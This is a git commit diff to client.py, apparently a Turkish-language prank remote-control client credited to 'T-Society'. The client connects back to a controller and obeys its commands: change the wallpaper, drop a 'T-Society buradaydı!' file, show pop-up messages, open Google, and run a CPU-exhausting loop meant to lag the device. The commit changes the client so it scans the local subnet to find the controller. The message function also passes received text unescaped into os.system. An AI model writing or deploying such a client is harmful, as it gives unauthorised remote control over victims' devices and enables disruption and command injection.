6fb1a2171dac72fc29b1c9880e5a307cbc772095
RobotAdam899 <anonbot918@gmail.com>
2025-07-14 05:22:08 +0300

    Update client.py
    Signed-off-by: RobotAdam899 <anonbot918@gmail.com>

--- client.py
+++ client.py
@@ -31,15 +31,6 @@ def arkaplan_degistir(url):
     except:
         s.send("[!] Arka plan degistirilemedi\n".encode())
 
-def saka_modu(mesaj):
-    if cihaz == "Telefon":
-        os.system(f'termux-notification --title "Şaka Modu" --content "{mesaj}"')
-    elif cihaz == "Windows PC":
-        os.system(f'msg * "{mesaj}"')
-    elif cihaz == "Linux PC":
-        os.system(f'notify-send "Şaka Modu" "{mesaj}"')
-    s.send("[!] Şaka modu mesajı gönderildi!\n".encode())
-
 def google_ac():
     if cihaz == "Telefon":
         os.system("termux-open-url https://www.google.com")
@@ -54,46 +45,55 @@ def dosya_olustur():
         f.write("T-Society buradaydı!")
     s.send("[+] Dosya olusturuldu\n".encode())
 
+def saka_modu(mesaj):
+    if cihaz == "Telefon":
+        os.system(f'termux-notification --title "Şaka" --content "{mesaj}"')
+    elif cihaz == "Windows PC":
+        os.system(f'msg * "{mesaj}"')
+    elif cihaz == "Linux PC":
+        os.system(f'notify-send "Şaka" "{mesaj}"')
+    s.send("[!] Şaka modu mesajı gönderildi!\n".encode())
+
 def saldiri_yap():
-    for _ in range(9999999):
+    for _ in range(1000000):
         _ = 9 ** 999
     s.send("[✓] Cihaz kasarildi\n".encode())
 
-# === BAĞLANTI ===
-
+# === IP TARAMA VE BAĞLANTI ===
 cihaz = cihaz_tipi()
-SERVER_IP = input("Server IP gir: ")
-PORT = int(input("Port gir: "))
+modem_ip = input("Modem IP gir (örnek 192.168.1.1): ")
+port = int(input("Port gir: "))
+modem_base = ".".join(modem_ip.split(".")[:-1])
 
-s = socket.socket()
-try:
-    s.connect((SERVER_IP, PORT))
-    s.send(f"[+] {cihaz} baglandi.".encode())
-except:
-    print("[!] Baglanti hatasi.")
-    exit()
-
-# === KOMUT DÖNGÜSÜ ===
-
-while True:
+for i in range(2, 255):
+    hedef_ip = f"{modem_base}.{i}"
     try:
-        komut = s.recv(1024).decode().strip()
-        if komut == "google":
-            google_ac()
-        elif komut == "saldiri":
-            saldiri_yap()
-        elif komut == "dosya":
-            dosya_olustur()
-        elif komut.startswith("arkaplan "):
-            _, url = komut.split(" ", 1)
-            arkaplan_degistir(url)
-        elif komut.startswith("saka "):
-            _, mesaj = komut.split(" ", 1)
-            saka_modu(mesaj)
-        elif komut == "exit":
-            s.close()
-            break
-        else:
-            s.send("[!] Bilinmeyen komut\n".encode())
-    except:
+        s = socket.socket()
+        s.settimeout(1)
+        s.connect((hedef_ip, port))
+        s.send(f"[+] {cihaz} baglandi.".encode())
+        print(f"[✓] Bağlandı: {hedef_ip}")
+        
+        # === KOMUT DÖNGÜSÜ ===
+        while True:
+            komut = s.recv(1024).decode().strip()
+            if komut == "google":
+                google_ac()
+            elif komut == "saldiri":
+                saldiri_yap()
+            elif komut == "dosya":
+                dosya_olustur()
+            elif komut.startswith("arkaplan "):
+                _, url = komut.split(" ", 1)
+                arkaplan_degistir(url)
+            elif komut.startswith("saka "):
+                _, mesaj = komut.split(" ", 1)
+                saka_modu(mesaj)
+            elif komut == "exit":
+                s.close()
+                break
+            else:
+                s.send("[!] Bilinmeyen komut\n".encode())
         break
+    except:
+        print(f"[-] Erişilemedi: {hedef_ip}")
